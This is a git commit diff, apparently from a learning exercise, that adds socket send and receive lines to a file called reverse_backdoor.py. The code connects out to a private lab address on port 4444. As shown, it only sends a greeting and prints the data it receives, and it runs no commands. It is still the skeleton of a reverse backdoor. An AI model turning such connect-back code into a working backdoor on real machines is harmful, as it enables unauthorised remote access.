03d650ddb279c033dca2fb896c232e0d81231146
Mário Gil <mg_mesquita@hotmail.com>
2018-08-04 20:21:24 +0100

    Sending and receiving data using sockets

--- reverse_backdoor.py
+++ reverse_backdoor.py
@@ -4,3 +4,11 @@ import socket
 
 connection = socket(socket.AF_INET, socket.SOCK_STREAM)
 connection.connect(("10.0.2.4", 4444))
+
+connection.send("\n[+] Connection established.\n")
+
+received_data = connection.recv(1024)
+print(received_data)
+
+
+connection.close()
